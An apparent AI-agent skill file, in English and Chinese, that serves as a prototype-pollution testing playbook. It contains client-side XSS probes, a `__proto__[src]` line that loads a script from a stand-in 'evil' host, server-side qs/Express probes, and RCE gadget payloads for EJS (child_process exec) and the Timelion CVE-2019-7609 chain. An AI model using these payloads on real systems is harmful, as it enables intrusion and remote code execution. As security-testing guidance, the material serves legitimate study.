---
name: prototype-pollution
description: >-
  Prototype pollution testing for JavaScript stacks. Use when user input is
  merged into objects (query parsers, JSON bodies, deep assign), when
  configuring libraries via untrusted keys, or when hunting RCE gadgets via
  polluted Object.prototype in Node or the browser.
---

# SKILL: Prototype Pollution — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert prototype pollution for client and server JS. Covers `__proto__` vs `constructor.prototype`, merge-sink detection, Express/qs-style black-box probes, and gadget chains (EJS, Timelion-class patterns, child_process/NODE_OPTIONS). Assumes you know object spread and prototype inheritance — focus is on **parser behavior** and **post-pollution sinks**.

中文路由提示：当存在深度合并、递归 assign、`JSON.parse` 后 `Object.assign`、或 URL 查询被转成嵌套对象时，优先怀疑 PP。

## 0. QUICK START

### Client-side first probes

```text
#__proto__[polluted]=1
#__proto__[polluted]=polluted
#constructor[prototype][polluted]=1
```

在可反射到 DOM 或框架路由的场景，配合 `alert(1)` / `console` 观察是否全局对象属性被污染。

```text
#__proto__[xxx]=alert(1)
```

### Server-side first probes（JSON / form）

```json
{"__proto__":{"polluted":true}}
```

```json
{"constructor":{"prototype":{"polluted":true}}}
```

发送后检查：后续无关响应是否带上异常头/状态码/JSON 空格，或应用逻辑是否读取到 `Object.prototype.polluted`（见 §3 探测表）。

### Quick boolean

若目标使用 `lodash.merge`、`deep-extend`、`hoek.applyToDefaults`、部分 `qs`/`query-string` 配置，**提高优先级**。

---

## 1. MECHANISM

**原型链**：访问 `obj.key` 时，若 `obj` 自有属性无 `key`，沿 `[[Prototype]]` 向上查，直至 `Object.prototype`。

**`__proto__`**：许多解析器把字面键 `__proto__` 当作「把下面属性接到原型上」的魔法键（`Object.prototype` 的历史可访问属性路径）。合并 `{ "__proto__": { "x": 1 } }` 可能等价于 `Object.prototype.x = 1`（视实现与修复版本而定）。

**`constructor.prototype`**：`constructor` 通常指向对象的构造函数；`constructor.prototype` 即该构造器的 `prototype` 对象。对普通对象默认连到 `Object.prototype`。路径如：

```json
{"constructor":{"prototype":{"polluted":1}}}
```

与 `__proto__` 不一定等价（过滤、JSON 解析、Bun/Node 差异），需**双线测试**。

**攻击本质**：不是「多传一个参数」，而是**在未隔离的合并算法**里，把可控键指向**原型对象**，使**全局**或**共享模板上下文**获得恶意属性，后续代码「正常」读取该属性即触发 gadget。

---

## 2. CLIENT-SIDE DETECTION

### URL fragment

```text
https://app.example/page#__proto__[admin]=1
```

```text
https://app.example/#__proto__[xxx]=alert(1)
```

若路由或 analytics 把 fragment 解析进对象再合并，可能污染。

### `constructor.prototype` path

```text
#constructor[prototype][role]=admin
```

### DOM / 属性注入思路

框架若把属性名当对象键合并：

```text
__proto__[src]=//evil/xss.js
```

事件处理器型键（实现相关）：

```text
__proto__[onerror]=alert(1)
```

**验证**：新开无 fragment 的页面，在控制台检查 `Object.prototype` 是否残留测试键；注意扩展与 DevTools 干扰。

---

## 3. SERVER-SIDE DETECTION (Express / Node, black-box)

以下载荷假设 body 或 query 被 **qs** 或同类解析器**深度解析**进对象（或与 `body-parser` 组合）。观测**全局副作用**，而非仅当前接口返回值。

| Payload（JSON 示意） | 预期可观察信号 |
|----------------------|----------------|
| `{"__proto__":{"parameterLimit":1}}` | 后续请求中多参数被忽略或解析异常（`qs` 风格 `parameterLimit`） |
| `{"__proto__":{"ignoreQueryPrefix":true}}` | `??foo=bar` 类双问号前缀被接受或行为突变 |
| `{"__proto__":{"allowDots":true}}` | `?foo.bar=baz` 嵌套键按点号展开生效 |
| `{"__proto__":{"json spaces":" "}}` | JSON 序列化响应出现额外空格（`JSON.stringify` 受污染空格设置影响） |
| `{"__proto__":{"exposedHeaders":["foo"]}}` | CORS 响应出现 `foo` 相关头（若框架从原型读配置） |
| `{"__proto__":{"status":510}}` | 某条响应状态码变为 510 或异常码（应用从对象读 `status`） |

**操作要点**：先发污染请求，再发**干净**请求观察是否持久；连接池与 worker 生命周期会影响「是否全局可见」。

---

## 4. EXPLOITATION GADGETS

| 目标 / 场景 | 载荷或模式 | 备注 |
|-------------|------------|------|
| **EJS** | `{"__proto__":{"client":1,"escapeFunction":"JSON.stringify; process.mainModule.require('child_process').exec('COMMAND')"}}` | `escapeFunction` 等选项若被模板引擎从受污原型读取，可导向 RCE；版本与配置强相关 |
| **Timelion 表达式链（CVE-2019-7609）** | `.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("COMMAND")')` | 历史链：原型污染 + 时间线表达式执行；用于理解 **表达式 + PP** 组合 |
| **Node `child_process`** | 污染 `shell`、`argv0`、`env`、`NODE_OPTIONS` 等（经合并进 `exec`/`fork` 选项对象） | 依赖后续是否 `spawn`/`fork` 且从原型链读取选项 |
| **通用 constructor 路径** | `{"constructor":{"prototype":{"foo":"bar"}}}` | 绕过仅过滤 `__proto__` 键的弱校验 |

**链式思维**：污染 → 某依赖 `obj.settings.xxx` 且未 `hasOwnProperty` → RCE / SSRF / 路径穿越。

---

## 5. TOOLS

| 项目 | 用途 |
|------|------|
| **yeswehack/pp-finder** | 辅助定位 PP 易感合并点与模式 |
| **yuske/silent-spring** | 研究与检测相关原型污染面 |
| **yuske/server-side-prototype-pollution** | 服务端 PP 测试套件/思路 |
| **BlackFan/client-side-prototype-pollution** | 浏览器端 PP 案例与 payload |
| **portswigger/server-side-prototype-pollution** | Burp 生态扩展/配套材料 |
| **msrkp/PPScan** | 扫描/验证辅助 |

优先在**授权**目标上使用；自动化工具可能对状态ful 应用产生副作用。

---

## 6. DECISION TREE

```
                    Input merged into nested object?
                    (query, JSON, GraphQL vars, YAML→JSON)
                                |
               NO --------------+-------------- YES
               |                              |
        Other vuln class                Parser allows __proto__ /
                                        constructor.prototype keys?
                                                    |
                                    NO --------------+-------------- YES
                                    |                              |
                             Check unicode /                    Confirm global effect:
                             bypass of key names               clean follow-up request
                                    |                              |
                                    +--------------+----------------+
                                                   |
                                                   v
                                    Gadget present? (template, spawn, JSON.stringify opts, CORS)
                                                   |
                              NO ------------------+------------------ YES
                              |                                         |
                       Report PP as DoS /              Build minimal RCE or
                       logic impact                   high-impact PoC
                              |                                         |
                              +---------------------+-------------------+
                                                    |
                                                    v
                              Client-side: fragment / DOM / third-party script
                              Server-side: qs/body-parser/lodash/deep-merge version audit
```

---

## Related routing

- 输入路由与多类注入并列入口 → [Injection Testing Router](../injection-checking/SKILL.md)。
- 模板执行链（非 PP）→ [SSTI](../ssti-server-side-template-injection/SKILL.md)。
- 不安全反序列化（非 JS 原型）→ [Deserialization](../deserialization-insecure/SKILL.md)。
